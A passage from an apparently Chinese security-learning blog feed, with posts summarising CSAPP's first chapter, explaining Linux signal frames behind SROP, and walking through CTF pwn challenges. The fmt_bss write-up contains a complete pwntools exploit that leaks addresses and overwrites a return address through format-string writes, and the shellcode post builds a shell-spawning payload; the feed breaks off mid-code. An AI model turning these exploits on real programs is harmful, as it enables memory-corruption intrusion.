    <content type="html"><![CDATA[<p>计算机专业的同学应该都听过一本书，<code>深入理解计算机系统(CSAPP)</code></p><p>其实我很早就开始读了，但是只是囫囵吞枣，根本不知所云，于是便放弃了一段时间。</p><p>现在经历了许多(并非)，对许多名词有了一些概念后，我又重新翻开了这本书，发现许多地方豁然开朗，今天将第一章，<code>计算机系统漫游</code>，也就是标题所说的<code>panorama</code>，总结一下，以遍展开后续的学习。</p><p>以这本书的方式，从你的第一个程序<code>hello</code>的生命周期说起，我们来开始对系统的学习</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,World!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>hello</code>这个程序，从被你用编辑器创建，到在系统运行，再到输出信息，最后中止，中间发生了什么？</p><p>首先你用某个编辑器创建了文件<code>hello.c</code>，写下代码，并保存，其被称为<strong>源程序</strong>，储存在<code>磁盘</code>中，实际上就是一个由值0和1组成的<strong>位</strong>(又称比特bit)序列，每8个位被称为一个<strong>字节</strong>，每个字节表示程序中的某些文本字符。</p><p>字符如何和字节所代表的数字序列对应呢，通常采用<code>ASCII标准</code>用数字来表示文本字符，二者一一对应</p><p><img src="/images/10.png" alt="如图所示"></p><p>现在，你应该理解了一个基本思想，计算机系统中所有的信息，无论是磁盘文件，内存中的程序，还是网络上传送的数据，都不过是一串<code>比特</code>。区分不同数据对象的唯一方法是我们读到的这些数据的<code>上下文</code>，在不同的上下文中，一个同样的字节序列可能会有不同的含义，这点要注意。</p><p>那么hello.c是怎么变成可执行文件hello的呢？</p><p><img src="/images/11.png" alt="编译系统"></p><p>如图所示，hello.c经过预处理，编译，汇编，链接，最终得到我们的可执行文件hello</p><p>我就直接引用原文了</p><p><img src="/images/12.png" alt="预处理，编译"></p><p><img src="/images/13.png" alt="汇编，链接"></p><p>其中，编译涉及到优化程序的<strong>性能</strong>，链接过程我是通过<code>pwn</code>中<code>ret2dlresolve</code>这种攻击方式才得以理解，涉及链接过程的细节与机制，以及各种安全问题，可以参考我的另一篇博客，虽然我还没写…</p><p>到这里，便得到了可执行文件<code>hello</code>，接下来运行它时发生了什么？</p><p>在终端中可以看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux&gt; ./hello<br>Hello,World!<br>linux&gt; <br></code></pre></td></tr></table></figure><p>累了，休息，有空再写…</p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>panorama</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2dlresolve</title>
    <link href="/2026/01/15/ret2dlresolve/"/>
    <url>/2026/01/15/ret2dlresolve/</url>
    
    <content type="html"><![CDATA[<p>关于动态链接与延迟绑定</p><p>想起来再写…</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dlresolve</tag>
      
      <tag>动态链接</tag>
      
      <tag>延迟绑定</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>signal</title>
    <link href="/2026/01/15/signal/"/>
    <url>/2026/01/15/signal/</url>
    
    <content type="html"><![CDATA[<p>此篇blog为SROP那一章的后续，主要补充一下linux中的信号处理机制</p><p>为什么写这篇呢，因为我发现我虽然能构造SROP利用，但是却并不明白为什么能这么做</p><p>最近在学习操作系统时，学习到了这么一个知识点，进程在进行上下文切换时，也会有保存寄存器，恢复寄存器这样的一个动作，但是保存的地方是内核栈，那我为什么在用户栈布置上下文(context)时能<code>make sense</code>呢?</p><p><img src="/images/9.png" alt="如图所示"></p><p>经过查阅资料发现，原来这两样东西完全是不同的机制。</p><p>第一种情况，在进程进行上下文切换时，例如从进程A切换至进程B，进程A的寄存器此时保存在内核栈，待进程A重新被调度时，才会从内核栈恢复寄存器，重新进入进程A，此时用户不可控。</p><p>第二种情况，也就是本文的主题，即linux系统的信号处理机制</p><p>信号在硬件层面发生异常&#x2F;中断时，内核会向进程发送<strong>信号</strong>，通知用户进程发生了某种事情</p><p>常见如:</p><ul><li><p>除数为零(异常) -&gt; SIGFPE</p></li><li><p>非法内存访问(异常) -&gt; SIGSEGV 也就是pwn手经常看到的<code>segmentation fault</code></p></li><li><p>当你按下<code>Ctrl+C</code>时(产生键盘中断) -&gt; SIGINT</p></li></ul><p>那么，内核如何发送这个信号到用户进程呢，本质是在用户态调用了一个<code>signal handler</code>函数，想象一下，用户进程正在愉快地执行，此时发生了某种事件，于是内核决定发送信号，CPU此时立即进入内核态(trap)，此时内核要保存被打断的寄存器，这便是第一种情况<code>受限直接执行</code>的一部分，但是这些寄存器只是暂时保存在内核栈，不是最终保存位置，我们接着看。</p><p>接下来，内核判断是否要处理信号，内核在一系列判断后，如果确定要发送这个<code>signal handler</code>，于是进入<code>signal delivery path</code>，接下来便是关键步骤:内核<strong>伪造</strong>用户态调用栈</p><p>内核会在用户栈上分配一个<code>sigframe</code>，简化后大致如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rt_sigframe</span> &#123;</span><br>    <span class="hljs-type">char</span> pretcode[<span class="hljs-number">8</span>];   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> <span class="hljs-title">uc</span>;</span>   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">siginfo</span> <span class="hljs-title">info</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这些分别代表什么？我们只需要关注两样东西</p><p>首先，<code>char pretcode[8];</code>，这个地址通常是glibc提供的<code>trampoline</code>，我们不妨叫它<code>rt_sigreturn_trampoline</code>，指令你应该很熟悉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax, SYS_rt_sigreturn  //linux x86-64下即是15<br>syscall<br></code></pre></td></tr></table></figure><p>然后，<code>ucontext</code>见下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  uc_flags;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> *<span class="hljs-title">uc_link</span>;</span><br>    <span class="hljs-type">stack_t</span>        uc_stack;<br>    <span class="hljs-type">sigset_t</span>       uc_sigmask;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span> <span class="hljs-title">uc_mcontext</span>;</span>  <span class="hljs-comment">// 想我了吗?</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>看到<code>sigcontext</code>了吗，这便是SROP中利用的关键，保存着所有的寄存器</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> *<span class="hljs-title">fpstate</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> reserved1[<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>内核在用户栈伪造了这个<code>sigframe</code>后将<code>rip</code>设置为<code>handler</code>(即原执行流变为执行信号处理函数)，将<code>rsp</code>设置为<code>rt_sigreturn_trampoline</code>，在执行完信号处理函数后，因为<code>handler</code>函数的最后一条指令通常是<code>ret</code>，因此，<code>pop rip</code>，执行<code>rt_sigreturn_trampoline</code></p><p>系统再次进入内核态，无条件地信任它自己在用户栈设置的<code>sigframe</code>，从<code>sigcontext</code>中恢复所有保存的寄存器，程序恢复至被中断前的执行点</p><p>总结一下全过程:</p><p>1.用户代码正常运行，突然，发生程序异常&#x2F;硬件中断等”事故”</p><p>2.CPU进入内核态并保存寄存器到<code>pt_regs</code>(内核栈中的一个结构体，保存关键寄存器)</p><p>3.内核决定要运行<code>handler</code>:在用户栈写<code>rt_sigframe</code>(把<code>pt_regs</code>的快照写到<code>uc_mcontext</code>)，然后修改<code>pt_regs</code>使得<code>rip=handler</code>,<code>rsp=rt_sigframe</code>, 并设置<code>handler</code>参数寄存器</p><p>4.内核执行<code>return-to-user</code>(<strong>iretq</strong>)，CPU恢复并开始执行<code>handler</code>(看起来像是<code>normal call</code>)</p><p>5.<code>handler</code>执行完，ret，返回到<code>trampoline</code>，<code>trampoline</code> 做<code>syscall SYS_rt_sigreturn</code></p><p>6.内核进入<code>sys_rt_sigreturn</code>:<code>copy_from_user</code>把<code>rt_sigframe</code>中<code>sigcontext</code>保存的寄存器读回，写入 <code>pt_regs</code>，恢复信号</p><p>7.内核再次<code>return-to-user</code>(<strong>iretq</strong>)，CPU将<code>pt_regs</code>中的所有寄存器恢复到硬件，程序继续被中断前的执行点</p><p>至此，终于理解了SROP技术的本质:在用户栈上伪造一次“合法的信号处理返回现场”，然后<code>诱骗</code>内核执行<code>rt_sigreturn</code>(即想办法设置rax为15并syscall)，让内核按攻击者提供的上下文(<strong>sigcontext</strong>)恢复寄存器，彻底接管执行流!</p><p>感谢阅读!</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SROP</tag>
      
      <tag>linux信号机制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fmt_bss</title>
    <link href="/2026/01/02/fmt-bss/"/>
    <url>/2026/01/02/fmt-bss/</url>
    
    <content type="html"><![CDATA[<p>今天依旧是一道格式化字符串漏洞的题目，题目出自NewStarCTF2025的week5pwn</p><p>hint:对于常规的栈上格式化字符串漏洞，可以任意构造自己的恶意数据来实现任意地址写，但是对于非栈上变量来说，就无法直接给出目的地址的指针，此时就需要留意栈上残留的内容，看看能不能找到可以利用的点(善用你的gdb)…</p><p>先来看看题目逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  setup();<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00102048);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_001020c0);<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-built_in">memset</span>(global_buffer,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(&amp;DAT_0010210d);   #一段嘲讽你的话<br>    read(<span class="hljs-number">0</span>,global_buffer,<span class="hljs-number">0xff</span>);<br>    <span class="hljs-built_in">printf</span>(global_buffer);  <span class="hljs-meta">#xswlhhh</span><br>    iVar1 = <span class="hljs-built_in">strcmp</span>(global_buffer,<span class="hljs-string">&quot;end\n&quot;</span>);<br>  &#125; <span class="hljs-keyword">while</span> (iVar1 != <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0010211a);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在后门函数<code>win</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(&amp;DAT_00102010,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>明显存在格式化字符串漏洞，但是对比<code>bss_got</code>的不同之处在于之前我们输入形如<code>AAAA.%p.%p.%p.%p</code>可以看到A写在哪里以实现任意地址写，这次是bss段上的fmt，因此并没有那么容易任意写，我们看看有哪些可以利用的地方，比如，栈上残留的某个<strong>指针</strong>?</p><p><img src="/images/7.png" alt="stack"></p><p>经过敏锐的观察，不难发现，第6个地址0x7fffffffdda0与第26个地址0x7fffffffde00在栈上存在着某种关系…</p><p><code>0x7fffffffdda0 —▸ 0x7fffffffde00 ◂— 0</code></p><p>怎么理解呢，二者也就是<strong>指针</strong>的关系</p><p>0x7fffffffdda0是一个栈地址，存储着值0x7fffffffde00(即指向这个地址的指针)</p><p>0x7fffffffde00是另一个栈地址，这里存储着0</p><p>那么就有思路了，我们用逐字节写的方式修改<code>0x7fffffffdda0</code>处的指针，使其指向返回地址(rip)的位置，同理，用逐字节写的方式修改<code>0x7fffffffde00</code>处的值为win函数所在的地址</p><p>可能略微有点抽象，但结果就是，返回地址(rip)变为了<code>0x7fffffffdda0</code>，而这又是一个指向<code>0x7fffffffde00</code>的指针，而<code>0x7fffffffde00</code>处的值已经被我们改写为了<code>win</code>，从而获得了<code>flag</code></p><p>真是精妙绝伦啊~</p><p>还有一点需要注意的是，程序是<code>pie enabled</code>(区别于<code>ASLR</code>)，但是也很明显，可以通过泄露的第一个地址<code>0x555555558060</code>获得pie基址</p><p><img src="/images/8.png" alt="vmmap"></p><p>使用vmmap可以看到<code>pie_base = p1 - 0x4060</code></p><p>那么<code>win = pie_base + win偏移</code></p><p>接下来就来展示一下exp吧…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p&#x27;</span>)<br>p_base = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x004060</span>    <span class="hljs-comment">#不保留换行符</span><br>log.success(<span class="hljs-string">f&#x27;p_base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(p_base)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p %p %p %p %p %p&#x27;</span>)<br>rip = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>).decode().split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">0x98</span>  <span class="hljs-comment">#计算rip，由图可知rip = p6 - 0x98</span><br>log.success(<span class="hljs-string">f&#x27;rip -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)&#125;</span>&#x27;</span>)<br><br>win = p_base + <span class="hljs-number">0x001289</span>  <span class="hljs-comment">#objdump -d ./bss_fmt | grep &quot;win&quot;</span><br>log.success(<span class="hljs-string">f&#x27;win -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(win)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%(<span class="hljs-number">256</span>*<span class="hljs-number">256</span>)&#125;</span>c%6$hn&#x27;</span>.encode())  <span class="hljs-comment">#改为rip</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#重复逐字节写...</span><br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">1</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">2</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">3</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">4</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">5</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#计划，通!</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>也是成功拿到<code>flag</code>了~</p><p>经过此题，应该能更加深刻地理解指针的本质，希望你能有所收获</p><p>感谢阅读…</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fmt</tag>
      
      <tag>指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode</title>
    <link href="/2026/01/02/shellcode/"/>
    <url>/2026/01/02/shellcode/</url>
    
    <content type="html"><![CDATA[<p>今天来分享一下关于shellcode编写技术的一些题目，在此之前，需要你对x86-64的汇编指令，寄存器调用约定，栈有一定了解</p><p>先来讲比较简单的ret2shellcode技术</p><p>前提条件是<code>NX</code>保护没开，即栈可执行</p><p>因此可以直接使用pwntools的一个非常强大的集成功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>通常payload是:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = shellcode + 偏移 + addr_to_shellcode(返回地址)<br></code></pre></td></tr></table></figure><p>此时shellcode在栈上，你可能需要先泄露栈地址，当然在本地可以用gdb一眼看出</p><p>当然在这方面还有<code>ret2reg</code>,<code>NOP sled</code>等技术，就不展开了(´・ω・&#96;)，感兴趣可以自行查阅资料</p><p>下面分享一些我遇到的与shellcode编写相关的题目</p><p>这些题目普遍与<code>mmap</code>(Memory Map)相关，其是Unix&#x2F;Linux提供的一种将文件或设备映射到进程虚拟内存空间的机制，使得文件内容可以像操作普通内存一样被访问</p><p>先来看第一题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  code *__buf;<br>  init(param_1);<br>  __buf = (code *)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x114514</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x22</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input a small function (also after compile)&quot;</span>);<br>  read(<span class="hljs-number">0</span>,__buf,<span class="hljs-number">0x14</span>);<br>  clear();<br>  (*__buf)();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mmap((void *)0x114514,0x1000,7,0x22,-1,0)</code>怎么理解呢，<code>0x114514</code>代表指定映射的期望地址,但也不一定必须是这儿(xswl),<code>0x1000</code>代表长度，这里是映射一页(4KB),7代表权限为<code>RWX</code>，可读可写可执行，这是关键，后面则表示这是一个纯内存页，不关联任何文件</p><p>所以这道题便很好理解了，直接把编写好的shellcode写入buf即可，接下来程序便会直接将其当作函数指针调用，并执行你的shellcode</p><p>但是关键点在于buf的长度只有0x14(20)，所以我们手动放大一下</p><p>首先关于read(0,buf,0x14)的寄存器调用约定，rax存放read的系统调用号0，rdi为第一个调用的寄存器，是fd(0,stdin)，rsi第二个，为buf的起始地址，rdx是读取的大小，最后执行<code>syscall</code>，就相当于执行了这么一个读取的指令</p><p>要扩大读取范围，我们将rdx修改为<code>0xff</code>(应该够了，注意限制，尽量少用一点字节数)，把rsi设置为当前的rip后0x20(大于0x14即可，同样限制一下字节数)的地址，调用syscall，写入shellcode，最后跳转rsi执行即可</p><p>我的exp，只用了13字节便成功改写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 